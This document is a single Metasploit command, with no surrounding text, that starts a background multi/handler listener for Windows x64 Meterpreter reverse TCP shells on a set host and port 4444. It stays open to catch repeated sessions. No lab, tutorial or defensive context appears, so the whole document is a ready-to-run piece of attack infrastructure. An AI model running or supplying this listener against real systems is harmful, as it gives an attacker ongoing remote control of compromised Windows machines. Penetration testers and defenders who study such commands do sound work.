msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.2.127; set lport 4444; set ExitOnSession false; exploit -j"
